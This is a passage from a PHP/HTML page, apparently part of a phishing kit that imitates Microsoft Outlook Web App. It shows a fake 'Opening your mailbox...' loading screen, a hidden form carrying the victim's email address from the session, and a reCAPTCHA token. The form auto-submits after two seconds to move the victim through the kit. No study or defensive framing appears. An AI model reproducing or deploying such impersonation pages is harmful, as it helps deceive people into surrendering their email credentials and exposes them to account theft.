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'/>
            <style>
                .loadingSpinnerContainer {
                    width: 32px;
                    height: 32px;
                    display: block;
                    vertical-align: top;
                    margin-left: auto;
                    margin-right: auto;
                }

                .smallSpinner {
                    width: 16px;
                    height: 16px;
                }

                .loadingSpinner {
                    width: 28px;
                    height: 28px;
                    position: relative;
                    padding: 4px 0 0 4px;
                    overflow: hidden;
                    -webkit-animation-duration: 1000ms;
                    -webkit-animation-iteration-count: infinite;
                    -webkit-animation-timing-function: steps(8, end);
                    -webkit-animation-name: rotate;
                    -moz-animation-duration: 1000ms;
                    -moz-animation-iteration-count: infinite;
                    -moz-animation-timing-function: steps(8, end);
                    -moz-animation-name: rotate;
                    -ms-animation-duration: 1000ms;
                    -ms-animation-iteration-count: infinite;
                    -ms-animation-timing-function: steps(8, end);
                    -ms-animation-name: rotate;
                    animation-duration: 1000ms;
                    animation-iteration-count: infinite;
                    animation-timing-function: steps(8, end);
                    animation-name: rotate;
                }

                .smallSpinner > .loadingSpinner {
                    width: 14px;
                    height: 14px;
                    padding: 2px 0 0 2px;
                }

                @-webkit-keyframes rotate {
                    from {
                        -webkit-transform: rotate(0deg);
                    }

                    to {
                        -webkit-transform: rotate(360deg);
                    }
                }

                @-moz-keyframes rotate {
                    from {
                        -moz-transform: rotate(0deg);
                    }

                    to {
                        -moz-transform: rotate(360deg);
                    }
                }

                @-ms-keyframes rotate {
                    from {
                        -ms-transform: rotate(0deg);
                    }

                    to {
                        -ms-transform: rotate(360deg);
                    }
                }

                @keyframes rotate {
                    from {
                        transform: rotate(0deg);
                    }

                    to {
                        transform: rotate(360deg);
                    }
                }

                .loadingSpinner > .loadingBall {
                    width: 6px;
                    height: 6px;
                    border-radius: 100%;
                    position: absolute;
                    -webkit-transform-origin: 12px 12px;
                    -moz-transform-origin: 12px 12px;
                    -ms-transform-origin: 12px 12px;
                    transform-origin: 12px 12px;
                }

                .smallSpinner > .loadingSpinner > .loadingBall {
                    width: 3px;
                    height: 3px;
                    -webkit-transform-origin: 6px 6px;
                    -moz-transform-origin: 6px 6px;
                    -ms-transform-origin: 6px 6px;
                    transform-origin: 6px 6px;
                }

                .loadingSpinner > .loadingBall:nth-child(1) {
                    -webkit-transform: rotate(45deg);
                    -moz-transform: rotate(45deg);
                    -ms-transform: rotate(45deg);
                    transform: rotate(45deg);
                }

                .loadingSpinner > .loadingBall:nth-child(2) {
                    opacity: .8;
                    -webkit-transform: rotate(0deg);
                    -moz-transform: rotate(0deg);
                    -ms-transform: rotate(0deg);
                    transform: rotate(0deg);
                }

                .loadingSpinner > .loadingBall:nth-child(3) {
                    opacity: .6;
                    -webkit-transform: rotate(-45deg);
                    -moz-transform: rotate(-45deg);
                    -ms-transform: rotate(-45deg);
                    transform: rotate(-45deg);
                }

                .loadingSpinner > .loadingBall:nth-child(4) {
                    opacity: .4;
                    -webkit-transform: rotate(-90deg);
                    -moz-transform: rotate(-90deg);
                    -ms-transform: rotate(-90deg);
                    transform: rotate(-90deg);
                }

                .loadingSpinner > .loadingBall:nth-child(5) {
                    opacity: .25;
                    -webkit-transform: rotate(-135deg);
                    -moz-transform: rotate(-135deg);
                    -ms-transform: rotate(-135deg);
                    transform: rotate(-135deg);
                }

                .loadingSpinner > .loadingBall:nth-child(6) {
                    opacity: .15;
                    -webkit-transform: rotate(-180deg);
                    -moz-transform: rotate(-180deg);
                    -ms-transform: rotate(-180deg);
                    transform: rotate(-180deg);
                }

                .loadingSpinner > .loadingBall:nth-child(7) {
                    opacity: .075;
                    -webkit-transform: rotate(-225deg);
                    -moz-transform: rotate(-225deg);
                    -ms-transform: rotate(-225deg);
                    transform: rotate(-225deg);
                }

                .loadingSpinner > .loadingBall:nth-child(8) {
                    opacity: .05;
                    -webkit-transform: rotate(-270deg);
                    -moz-transform: rotate(-270deg);
                    -ms-transform: rotate(-270deg);
                    transform: rotate(-270deg);
                }

                .loadingBallColor {
                    background: #0072c6;
                }
            </style>
            <div dir="ltr" class="loadingSpinnerContainer" id="cssloadingSpinnerContainer">
                <div class="loadingSpinner loadingSpinnerAnimation">
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                    <div class="loadingBall loadingBallColor"></div>
                </div>
            </div>
            <div id="statusText" class="script">
                <span class="script">Opening your mailbox...</span>
            </div>
        </div>
        <div id='preloadDiv' style="visibility:hidden;height: 1px; margin-bottom: -1px; overflow: hidden;">
        </div>
		<form action="" id="myform" name="myform" method="POST">
			<input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
			<input type="hidden" name="cemail" value="<?php echo $_SESSION['owaemail']; ?>">
			<input type="hidden" name="send" value="send">
			<input type="Submit" name="Submit" class="hideme">
			<div class="loader"></div>
		</form>
		<script>
			grecaptcha.ready(function() {
				grecaptcha.execute('<?php echo $captcha_site_key; ?>', {action:'validate_captcha'}).then(function(token) {
					document.getElementById('g-recaptcha-response').value = token;
				});
			});
		</script>
		<script type="text/javascript">
			window.onload=function(){ 
				window.setTimeout(document.myform.submit.bind(document.myform),2000);
			};
		</script>
    </body>
</html>
<?php
}
